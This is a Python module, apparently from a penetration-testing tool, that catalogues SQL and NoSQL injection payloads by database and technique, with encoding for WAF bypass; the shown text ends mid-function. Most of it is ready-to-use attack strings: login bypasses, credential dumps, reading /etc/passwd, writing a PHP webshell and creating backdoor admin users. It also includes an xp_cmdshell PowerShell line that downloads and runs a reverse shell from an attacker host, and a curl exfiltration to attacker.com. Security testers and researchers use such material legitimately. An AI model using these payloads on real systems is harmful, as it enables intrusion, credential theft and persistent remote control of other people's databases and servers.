"""
AIPTX SQL Injection Payload Database.

Comprehensive SQL injection payloads for multiple database types
with WAF bypass variants and encoding support.

Integrated from Zen-AI-Pentest for AIPTX v5.2.

Example usage:
    from aipt_v2.payloads import SQLInjectionDB, DBType, SQLITechnique

    db = SQLInjectionDB()

    # Get all MySQL payloads
    payloads = db.get_payloads(db_type=DBType.MYSQL)

    # Get time-based payloads for any database
    time_payloads = db.get_payloads(technique=SQLITechnique.BLIND_TIME)

    # Get WAF bypass variants
    variants = db.generate_waf_bypass_variants("' UNION SELECT @@version--")
"""

import base64
import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set

logger = logging.getLogger(__name__)


class DBType(Enum):
    """Supported database types."""

    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    MONGODB = "mongodb"  # NoSQL
    REDIS = "redis"  # NoSQL
    GENERIC = "generic"


class SQLITechnique(Enum):
    """SQL Injection techniques."""

    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"
    BLIND_BOOLEAN = "blind_boolean"
    BLIND_TIME = "blind_time"
    STACKED_QUERIES = "stacked_queries"
    OUT_OF_BAND = "out_of_band"


class EncodingType(Enum):
    """Payload encoding types for WAF bypass."""

    URL = "url"
    DOUBLE_URL = "double_url"
    BASE64 = "base64"
    HEX = "hex"
    UNICODE = "unicode"
    CHAR = "char"


@dataclass
class SQLPayload:
    """
    SQL Injection payload with metadata.

    Attributes:
        name: Descriptive name for the payload
        payload: The actual SQL injection string
        technique: Injection technique used
        db_type: Target database type
        severity: Severity if exploited (Critical, High, Medium, Low)
        description: What this payload does
        expected_result: What to expect if successful
        tags: Optional tags for categorization
    """

    name: str
    payload: str
    technique: SQLITechnique
    db_type: DBType
    severity: str
    description: str
    expected_result: str
    tags: Set[str] = field(default_factory=set)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "name": self.name,
            "payload": self.payload,
            "technique": self.technique.value,
            "db_type": self.db_type.value,
            "severity": self.severity,
            "description": self.description,
            "expected_result": self.expected_result,
            "tags": list(self.tags),
        }


@dataclass
class SQLInjectionFinding:
    """A confirmed SQL Injection finding."""

    url: str
    parameter: str
    technique: SQLITechnique
    db_type: DBType
    payload: str
    evidence: str
    severity: str = "Critical"
    response_time: Optional[float] = None

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "url": self.url,
            "parameter": self.parameter,
            "technique": self.technique.value,
            "db_type": self.db_type.value,
            "payload": self.payload,
            "evidence": self.evidence,
            "severity": self.severity,
            "response_time": self.response_time,
        }


class SQLInjectionDB:
    """
    Comprehensive SQL Injection Payload Database.

    Provides payloads for:
    - MySQL, PostgreSQL, MSSQL, Oracle, SQLite
    - MongoDB (NoSQL)
    - Multiple injection techniques
    - WAF bypass variants
    - Multiple encoding options

    Example:
        db = SQLInjectionDB()

        # Get detection payloads
        detection = db.get_detection_payloads()

        # Get database-specific payloads
        mysql_payloads = db.get_payloads(db_type=DBType.MYSQL)

        # Get technique-specific payloads
        union_payloads = db.get_payloads(technique=SQLITechnique.UNION_BASED)

        # Generate WAF bypass variants
        variants = db.generate_waf_bypass_variants("' UNION SELECT 1--")
    """

    def __init__(self):
        self.payloads = self._initialize_payloads()
        self._error_patterns = self._initialize_error_patterns()

    def _initialize_payloads(
        self,
    ) -> Dict[DBType, Dict[SQLITechnique, List[SQLPayload]]]:
        """Initialize the comprehensive payload database."""
        payloads: Dict[DBType, Dict[SQLITechnique, List[SQLPayload]]] = {}

        # Initialize structure
        for db in DBType:
            payloads[db] = {}
            for tech in SQLITechnique:
                payloads[db][tech] = []

        # ============================================================
        # MySQL Payloads
        # ============================================================

        payloads[DBType.MYSQL][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="MySQL Error - Single Quote",
                payload="'",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Basic error detection with single quote",
                expected_result="MySQL syntax error message",
                tags={"detection", "basic"},
            ),
            SQLPayload(
                name="MySQL Error - Double Quote",
                payload='"',
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Error detection with double quote",
                expected_result="MySQL error message",
                tags={"detection", "basic"},
            ),
            SQLPayload(
                name="MySQL Error - AND Boolean True",
                payload=" AND 1=1",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="High",
                description="Boolean-based true condition",
                expected_result="Normal query execution",
                tags={"boolean", "detection"},
            ),
            SQLPayload(
                name="MySQL Error - AND Boolean False",
                payload=" AND 1=2",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="High",
                description="Boolean-based false condition",
                expected_result="No results or different response",
                tags={"boolean", "detection"},
            ),
            SQLPayload(
                name="MySQL Error - OR Always True",
                payload="' OR '1'='1",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Classic OR true condition for auth bypass",
                expected_result="Query returns all rows",
                tags={"auth_bypass", "classic"},
            ),
            SQLPayload(
                name="MySQL Error - Divide by Zero",
                payload=" OR 1/0--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="High",
                description="Generate error via divide by zero",
                expected_result="Division by zero error",
                tags={"error", "detection"},
            ),
            SQLPayload(
                name="MySQL Error - EXTRACTVALUE",
                payload="' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="XML-based error extraction of version",
                expected_result="Version in error message",
                tags={"xml", "data_extraction"},
            ),
            SQLPayload(
                name="MySQL Error - UPDATEXML",
                payload="' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="XML-based error extraction of user",
                expected_result="Username in error message",
                tags={"xml", "data_extraction"},
            ),
        ]

        payloads[DBType.MYSQL][SQLITechnique.UNION_BASED] = [
            SQLPayload(
                name="MySQL Union - NULL Column Detection",
                payload=" UNION SELECT NULL--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Detect number of columns with single NULL",
                expected_result="Error if column count wrong, success otherwise",
                tags={"column_detection"},
            ),
            SQLPayload(
                name="MySQL Union - Two Columns",
                payload=" UNION SELECT NULL,NULL--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Union select with 2 columns",
                expected_result="Union query executed",
                tags={"column_detection"},
            ),
            SQLPayload(
                name="MySQL Union - Three Columns",
                payload=" UNION SELECT NULL,NULL,NULL--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Union select with 3 columns",
                expected_result="Union query executed",
                tags={"column_detection"},
            ),
            SQLPayload(
                name="MySQL Union - Version",
                payload=" UNION SELECT @@version--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract database version",
                expected_result="MySQL version displayed",
                tags={"data_extraction", "version"},
            ),
            SQLPayload(
                name="MySQL Union - User",
                payload=" UNION SELECT user()--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract current database user",
                expected_result="Database username",
                tags={"data_extraction", "user"},
            ),
            SQLPayload(
                name="MySQL Union - Database",
                payload=" UNION SELECT database()--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract current database name",
                expected_result="Database name displayed",
                tags={"data_extraction", "database"},
            ),
            SQLPayload(
                name="MySQL Union - All Tables",
                payload=" UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract all table names from current database",
                expected_result="List of table names",
                tags={"data_extraction", "schema"},
            ),
            SQLPayload(
                name="MySQL Union - Columns",
                payload=" UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract column names from users table",
                expected_result="List of columns",
                tags={"data_extraction", "schema"},
            ),
            SQLPayload(
                name="MySQL Union - Dump Credentials",
                payload=" UNION SELECT CONCAT(username,':',password) FROM users--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Dump username:password from users table",
                expected_result="Credential pairs",
                tags={"data_extraction", "credentials"},
            ),
            SQLPayload(
                name="MySQL Union - GROUP_CONCAT",
                payload=" UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract all tables in single row",
                expected_result="Comma-separated table names",
                tags={"data_extraction", "schema"},
            ),
        ]

        payloads[DBType.MYSQL][SQLITechnique.BLIND_TIME] = [
            SQLPayload(
                name="MySQL Time - SLEEP 5",
                payload="' OR SLEEP(5)--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Time-based detection with 5 second delay",
                expected_result="Response delayed by 5 seconds",
                tags={"detection", "time"},
            ),
            SQLPayload(
                name="MySQL Time - SLEEP 10",
                payload="' OR SLEEP(10)--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Time-based detection with 10 second delay",
                expected_result="Response delayed by 10 seconds",
                tags={"detection", "time"},
            ),
            SQLPayload(
                name="MySQL Time - BENCHMARK",
                payload="' OR BENCHMARK(10000000,SHA1(1))--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="CPU-intensive benchmark for time delay",
                expected_result="Response delayed due to CPU load",
                tags={"detection", "time", "cpu"},
            ),
            SQLPayload(
                name="MySQL Time - Conditional IF",
                payload="' OR IF(1=1,SLEEP(5),0)--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Conditional time delay",
                expected_result="5 second delay if condition is true",
                tags={"conditional", "time"},
            ),
            SQLPayload(
                name="MySQL Time - Extract DB Length",
                payload="' OR IF(LENGTH(database())>5,SLEEP(5),0)--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Extract database name length via timing",
                expected_result="Delay if DB name > 5 chars",
                tags={"data_extraction", "time"},
            ),
        ]

        payloads[DBType.MYSQL][SQLITechnique.BLIND_BOOLEAN] = [
            SQLPayload(
                name="MySQL Boolean - Length Check",
                payload="' AND LENGTH(DATABASE())=1--",
                technique=SQLITechnique.BLIND_BOOLEAN,
                db_type=DBType.MYSQL,
                severity="High",
                description="Check database name length",
                expected_result="True if length matches",
                tags={"data_extraction"},
            ),
            SQLPayload(
                name="MySQL Boolean - Substring",
                payload="' AND SUBSTRING(DATABASE(),1,1)='a'--",
                technique=SQLITechnique.BLIND_BOOLEAN,
                db_type=DBType.MYSQL,
                severity="High",
                description="Extract database name character by character",
                expected_result="True if character matches",
                tags={"data_extraction"},
            ),
            SQLPayload(
                name="MySQL Boolean - ASCII",
                payload="' AND ASCII(SUBSTRING(DATABASE(),1,1))>97--",
                technique=SQLITechnique.BLIND_BOOLEAN,
                db_type=DBType.MYSQL,
                severity="High",
                description="Binary search for characters",
                expected_result="True if ASCII > 97",
                tags={"data_extraction", "binary_search"},
            ),
        ]

        payloads[DBType.MYSQL][SQLITechnique.STACKED_QUERIES] = [
            SQLPayload(
                name="MySQL Stacked - Create User",
                payload="'; CREATE USER 'attacker'@'%' IDENTIFIED BY 'password123'--",
                technique=SQLITechnique.STACKED_QUERIES,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Create backdoor database user",
                expected_result="New user created",
                tags={"persistence", "dangerous"},
            ),
            SQLPayload(
                name="MySQL Stacked - Grant Privileges",
                payload="'; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%'--",
                technique=SQLITechnique.STACKED_QUERIES,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Grant full privileges to attacker user",
                expected_result="Privileges granted",
                tags={"persistence", "dangerous"},
            ),
        ]

        payloads[DBType.MYSQL][SQLITechnique.OUT_OF_BAND] = [
            SQLPayload(
                name="MySQL OOB - LOAD_FILE",
                payload="' UNION SELECT LOAD_FILE('/etc/passwd')--",
                technique=SQLITechnique.OUT_OF_BAND,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Read local file via LOAD_FILE",
                expected_result="File contents",
                tags={"lfi", "data_extraction"},
            ),
            SQLPayload(
                name="MySQL OOB - INTO OUTFILE",
                payload="' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
                technique=SQLITechnique.OUT_OF_BAND,
                db_type=DBType.MYSQL,
                severity="Critical",
                description="Write webshell to disk",
                expected_result="File created",
                tags={"rce", "webshell", "dangerous"},
            ),
        ]

        # ============================================================
        # PostgreSQL Payloads
        # ============================================================

        payloads[DBType.POSTGRESQL][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="PostgreSQL Error - Cast",
                payload="::integer",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="PostgreSQL cast error",
                expected_result="Type cast error",
                tags={"detection"},
            ),
            SQLPayload(
                name="PostgreSQL Error - Version Concat",
                payload="'||version()||'",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.POSTGRESQL,
                severity="High",
                description="Extract version via concatenation",
                expected_result="PostgreSQL version in error",
                tags={"data_extraction"},
            ),
        ]

        payloads[DBType.POSTGRESQL][SQLITechnique.UNION_BASED] = [
            SQLPayload(
                name="PostgreSQL Union - Version",
                payload=" UNION SELECT version()--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="Extract PostgreSQL version",
                expected_result="PostgreSQL version",
                tags={"data_extraction", "version"},
            ),
            SQLPayload(
                name="PostgreSQL Union - Current User",
                payload=" UNION SELECT current_user--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="Extract current user",
                expected_result="Current database user",
                tags={"data_extraction", "user"},
            ),
            SQLPayload(
                name="PostgreSQL Union - Tables",
                payload=" UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="Extract all public table names",
                expected_result="List of tables",
                tags={"data_extraction", "schema"},
            ),
        ]

        payloads[DBType.POSTGRESQL][SQLITechnique.BLIND_TIME] = [
            SQLPayload(
                name="PostgreSQL Time - pg_sleep",
                payload="'; SELECT pg_sleep(5)--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="Time-based with pg_sleep",
                expected_result="5 second delay",
                tags={"detection", "time"},
            ),
            SQLPayload(
                name="PostgreSQL Time - Heavy Query",
                payload="'; SELECT (SELECT COUNT(*) FROM generate_series(1,10000000))--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="CPU-intensive query for delay",
                expected_result="Response delayed",
                tags={"detection", "time", "cpu"},
            ),
        ]

        payloads[DBType.POSTGRESQL][SQLITechnique.STACKED_QUERIES] = [
            SQLPayload(
                name="PostgreSQL Stacked - Create Role",
                payload="'; CREATE ROLE attacker WITH LOGIN PASSWORD 'password123'--",
                technique=SQLITechnique.STACKED_QUERIES,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="Create backdoor role",
                expected_result="New role created",
                tags={"persistence", "dangerous"},
            ),
        ]

        payloads[DBType.POSTGRESQL][SQLITechnique.OUT_OF_BAND] = [
            SQLPayload(
                name="PostgreSQL OOB - COPY",
                payload="'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data='||current_user--",
                technique=SQLITechnique.OUT_OF_BAND,
                db_type=DBType.POSTGRESQL,
                severity="Critical",
                description="Exfiltrate data via HTTP",
                expected_result="Data sent to attacker server",
                tags={"data_exfil", "rce"},
            ),
        ]

        # ============================================================
        # MSSQL Payloads
        # ============================================================

        payloads[DBType.MSSQL][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="MSSQL Error - CONVERT",
                payload="' AND 1=CONVERT(int,@@version)--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="MSSQL convert error reveals version",
                expected_result="MSSQL version in error",
                tags={"data_extraction", "version"},
            ),
            SQLPayload(
                name="MSSQL Error - CAST",
                payload="' AND 1=CAST(@@version AS int)--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="MSSQL cast error",
                expected_result="MSSQL version in error",
                tags={"data_extraction", "version"},
            ),
        ]

        payloads[DBType.MSSQL][SQLITechnique.UNION_BASED] = [
            SQLPayload(
                name="MSSQL Union - Version",
                payload=" UNION SELECT @@version--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="Extract MSSQL version",
                expected_result="SQL Server version",
                tags={"data_extraction", "version"},
            ),
            SQLPayload(
                name="MSSQL Union - User",
                payload=" UNION SELECT SYSTEM_USER--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="Extract system user",
                expected_result="Current system user",
                tags={"data_extraction", "user"},
            ),
            SQLPayload(
                name="MSSQL Union - Databases",
                payload=" UNION SELECT name FROM master.dbo.sysdatabases--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="List all databases",
                expected_result="All database names",
                tags={"data_extraction", "schema"},
            ),
        ]

        payloads[DBType.MSSQL][SQLITechnique.BLIND_TIME] = [
            SQLPayload(
                name="MSSQL Time - WAITFOR DELAY",
                payload="'; WAITFOR DELAY '0:0:5'--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="Time-based with WAITFOR",
                expected_result="5 second delay",
                tags={"detection", "time"},
            ),
        ]

        payloads[DBType.MSSQL][SQLITechnique.STACKED_QUERIES] = [
            SQLPayload(
                name="MSSQL Stacked - Enable xp_cmdshell",
                payload="'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
                technique=SQLITechnique.STACKED_QUERIES,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="Enable xp_cmdshell for RCE",
                expected_result="xp_cmdshell enabled",
                tags={"rce", "dangerous"},
            ),
            SQLPayload(
                name="MSSQL Stacked - Execute Command",
                payload="'; EXEC xp_cmdshell 'whoami'--",
                technique=SQLITechnique.STACKED_QUERIES,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="Execute OS command via xp_cmdshell",
                expected_result="Command output",
                tags={"rce", "dangerous"},
            ),
            SQLPayload(
                name="MSSQL Stacked - Reverse Shell",
                payload="'; EXEC xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString(\"http://attacker/shell.ps1\")'--",
                technique=SQLITechnique.STACKED_QUERIES,
                db_type=DBType.MSSQL,
                severity="Critical",
                description="Download and execute reverse shell",
                expected_result="Reverse shell connection",
                tags={"rce", "dangerous", "powershell"},
            ),
        ]

        # ============================================================
        # Oracle Payloads
        # ============================================================

        payloads[DBType.ORACLE][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="Oracle Error - UTL_INADDR",
                payload="' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.ORACLE,
                severity="Critical",
                description="Oracle error-based extraction",
                expected_result="Oracle version in error",
                tags={"data_extraction", "version"},
            ),
        ]

        payloads[DBType.ORACLE][SQLITechnique.UNION_BASED] = [
            SQLPayload(
                name="Oracle Union - Version",
                payload=" UNION SELECT banner FROM v$version WHERE rownum=1--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.ORACLE,
                severity="Critical",
                description="Extract Oracle version",
                expected_result="Oracle version",
                tags={"data_extraction", "version"},
            ),
            SQLPayload(
                name="Oracle Union - User",
                payload=" UNION SELECT user FROM dual--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.ORACLE,
                severity="Critical",
                description="Extract current user",
                expected_result="Current Oracle user",
                tags={"data_extraction", "user"},
            ),
            SQLPayload(
                name="Oracle Union - Tables",
                payload=" UNION SELECT table_name FROM all_tables--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.ORACLE,
                severity="Critical",
                description="Extract all accessible tables",
                expected_result="List of tables",
                tags={"data_extraction", "schema"},
            ),
        ]

        payloads[DBType.ORACLE][SQLITechnique.BLIND_TIME] = [
            SQLPayload(
                name="Oracle Time - DBMS_LOCK.SLEEP",
                payload="' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 1 END FROM dual)--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.ORACLE,
                severity="Critical",
                description="Time-based with DBMS_LOCK.SLEEP",
                expected_result="5 second delay",
                tags={"detection", "time"},
            ),
            SQLPayload(
                name="Oracle Time - Heavy PL/SQL",
                payload="' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1 END FROM dual)--",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.ORACLE,
                severity="Critical",
                description="Time-based with DBMS_PIPE",
                expected_result="5 second delay",
                tags={"detection", "time"},
            ),
        ]

        # ============================================================
        # SQLite Payloads
        # ============================================================

        payloads[DBType.SQLITE][SQLITechnique.UNION_BASED] = [
            SQLPayload(
                name="SQLite Union - Version",
                payload=" UNION SELECT sqlite_version()--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.SQLITE,
                severity="Critical",
                description="Extract SQLite version",
                expected_result="SQLite version",
                tags={"data_extraction", "version"},
            ),
            SQLPayload(
                name="SQLite Union - Tables",
                payload=" UNION SELECT tbl_name FROM sqlite_master WHERE type='table'--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.SQLITE,
                severity="Critical",
                description="Extract table names",
                expected_result="List of tables",
                tags={"data_extraction", "schema"},
            ),
            SQLPayload(
                name="SQLite Union - Table Schema",
                payload=" UNION SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name='users'--",
                technique=SQLITechnique.UNION_BASED,
                db_type=DBType.SQLITE,
                severity="Critical",
                description="Extract table creation SQL",
                expected_result="CREATE TABLE statement",
                tags={"data_extraction", "schema"},
            ),
        ]

        # ============================================================
        # MongoDB (NoSQL) Payloads
        # ============================================================

        payloads[DBType.MONGODB][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="MongoDB - $ne Operator",
                payload='{"username": {"$ne": null}, "password": {"$ne": null}}',
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MONGODB,
                severity="Critical",
                description="NoSQL injection with $ne operator",
                expected_result="Authentication bypass",
                tags={"auth_bypass", "nosql"},
            ),
            SQLPayload(
                name="MongoDB - $gt Operator",
                payload='{"username": {"$gt": ""}, "password": {"$gt": ""}}',
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MONGODB,
                severity="Critical",
                description="NoSQL injection with $gt operator",
                expected_result="Authentication bypass",
                tags={"auth_bypass", "nosql"},
            ),
            SQLPayload(
                name="MongoDB - $regex",
                payload='{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MONGODB,
                severity="Critical",
                description="NoSQL injection with $regex",
                expected_result="Authentication bypass",
                tags={"auth_bypass", "nosql"},
            ),
            SQLPayload(
                name="MongoDB - $where JavaScript",
                payload='{"$where": "this.password.match(/.*/)"}',
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MONGODB,
                severity="Critical",
                description="NoSQL injection with $where and JavaScript",
                expected_result="All documents returned",
                tags={"nosql", "javascript"},
            ),
            SQLPayload(
                name="MongoDB - Array Param",
                payload="username[$ne]=invalid&password[$ne]=invalid",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.MONGODB,
                severity="Critical",
                description="Array-based NoSQL injection in URL params",
                expected_result="Authentication bypass",
                tags={"auth_bypass", "nosql", "url"},
            ),
        ]

        # ============================================================
        # Generic Payloads (Work on multiple databases)
        # ============================================================

        payloads[DBType.GENERIC][SQLITechnique.ERROR_BASED] = [
            SQLPayload(
                name="Generic - Single Quote",
                payload="'",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="High",
                description="Basic single quote test",
                expected_result="SQL error",
                tags={"detection", "basic"},
            ),
            SQLPayload(
                name="Generic - Double Quote",
                payload='"',
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="High",
                description="Double quote test",
                expected_result="SQL error",
                tags={"detection", "basic"},
            ),
            SQLPayload(
                name="Generic - Backslash",
                payload="\\",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="High",
                description="Backslash escape test",
                expected_result="SQL error",
                tags={"detection", "basic"},
            ),
            SQLPayload(
                name="Generic - Comment",
                payload="--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="Medium",
                description="Comment injection",
                expected_result="Query terminated",
                tags={"detection"},
            ),
            SQLPayload(
                name="Generic - Semicolon",
                payload=";",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="High",
                description="Stacked query attempt",
                expected_result="Error or second query executed",
                tags={"detection", "stacked"},
            ),
            SQLPayload(
                name="Generic - Auth Bypass Classic",
                payload="' OR '1'='1' --",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="Critical",
                description="Classic authentication bypass",
                expected_result="Login success",
                tags={"auth_bypass", "classic"},
            ),
            SQLPayload(
                name="Generic - Auth Bypass Admin",
                payload="admin'--",
                technique=SQLITechnique.ERROR_BASED,
                db_type=DBType.GENERIC,
                severity="Critical",
                description="Comment out password check",
                expected_result="Login as admin",
                tags={"auth_bypass"},
            ),
        ]

        return payloads

    def _initialize_error_patterns(self) -> List[tuple]:
        """Initialize SQL error detection patterns."""
        return [
            # MySQL
            (r"SQL syntax.*MySQL", DBType.MYSQL),
            (r"Warning.*mysql_.*\(", DBType.MYSQL),
            (r"valid MySQL result", DBType.MYSQL),
            (r"MySqlClient\.", DBType.MYSQL),
            (r"com\.mysql\.jdbc", DBType.MYSQL),
            # PostgreSQL
            (r"PostgreSQL.*ERROR", DBType.POSTGRESQL),
            (r"Warning.*pg_.*\(", DBType.POSTGRESQL),
            (r"valid PostgreSQL result", DBType.POSTGRESQL),
            (r"Npgsql\.", DBType.POSTGRESQL),
            (r"org\.postgresql", DBType.POSTGRESQL),
            # MSSQL
            (r"Driver.*SQL.*Server", DBType.MSSQL),
            (r"OLE DB.*SQL Server", DBType.MSSQL),
            (r"(\W|\A)SQL.*Server.*Driver", DBType.MSSQL),
            (r"Warning.*mssql_.*\(", DBType.MSSQL),
            (r"(\W|\A)SQL.*Server.*[0-9a-fA-F]{8}", DBType.MSSQL),
            (r"System\.Data\.SqlClient", DBType.MSSQL),
            # Oracle
            (r"Exception.*Oracle", DBType.ORACLE),
            (r"Oracle error", DBType.ORACLE),
            (r"Oracle.*Driver", DBType.ORACLE),
            (r"Warning.*oci_.*\(", DBType.ORACLE),
            (r"Microsoft.*OLE.*DB.*Oracle", DBType.ORACLE),
            (r"oracle\.jdbc", DBType.ORACLE),
            # SQLite
            (r"SQLite/JDBCDriver", DBType.SQLITE),
            (r"SQLite\.Exception", DBType.SQLITE),
            (r"System\.Data\.SQLite\.SQLiteException", DBType.SQLITE),
            (r"Warning.*sqlite_.*\(", DBType.SQLITE),
            (r"\[SQLITE_ERROR\]", DBType.SQLITE),
            (r"sqlite3\.OperationalError", DBType.SQLITE),
        ]

    def get_payloads(
        self,
        db_type: Optional[DBType] = None,
        technique: Optional[SQLITechnique] = None,
        tags: Optional[Set[str]] = None,
    ) -> List[SQLPayload]:
        """
        Get payloads filtered by database type, technique, and/or tags.

        Args:
            db_type: Filter by database type (None for all)
            technique: Filter by injection technique (None for all)
            tags: Filter by tags (payloads must have all specified tags)

        Returns:
            List of matching SQLPayload objects
        """
        results = []

        dbs = [db_type] if db_type else list(DBType)
        techs = [technique] if technique else list(SQLITechnique)

        for db in dbs:
            for tech in techs:
                if db in self.payloads and tech in self.payloads[db]:
                    for payload in self.payloads[db][tech]:
                        # Apply tag filter if specified
                        if tags and not tags.issubset(payload.tags):
                            continue
                        results.append(payload)

        return results

    def get_detection_payloads(self) -> List[SQLPayload]:
        """Get payloads specifically for SQLi detection."""
        return self.get_payloads(tags={"detection"})

    def get_auth_bypass_payloads(self) -> List[SQLPayload]:
        """Get payloads for authentication bypass."""
        return self.get_payloads(tags={"auth_bypass"})

    def get_data_extraction_payloads(
        self,
        db_type: Optional[DBType] = None,
    ) -> List[SQLPayload]:
        """Get payloads for data extraction."""
        return self.get_payloads(db_type=db_type, tags={"data_extraction"})

    def encode_payload(self, payload: str, encoding: EncodingType) -> str:
        """
        Encode payload with various methods for WAF bypass.

        Args:
            payload: Original payload string
            encoding: Encoding type to apply

        Returns:
            Encoded payload string
        """
        if encoding == EncodingType.URL:
            return urllib.parse.quote(payload)
        elif encoding == EncodingType.DOUBLE_URL:
